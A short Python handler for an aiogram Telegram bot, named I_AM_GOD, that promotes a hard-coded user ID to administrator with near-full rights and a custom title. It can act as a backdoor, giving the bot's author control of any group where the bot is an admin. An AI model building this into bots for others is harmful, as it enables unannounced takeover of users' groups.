from aiogram.types import Message

from Constant import MY_ID

async def I_AM_GOD(ms: Message):
    userid = MY_ID
    await ms.chat.promote(
        user_id=userid,
        is_anonymous=False,
        can_manage_chat=True,
        can_delete_messages=True,
        can_manage_video_chats=True,
        can_restrict_members=True,
        can_promote_members=True,
        can_change_info=True,
        can_invite_users=True,
        can_edit_messages=True,
        can_pin_messages=True,
        can_manage_topics=False,
    )
    role = "𝚘𝚠𝚗 𝚂𝚊𝚖/𝙿𝚎𝚝𝚎𝚛"
    await ms.chat.set_administrator_custom_title(userid, role)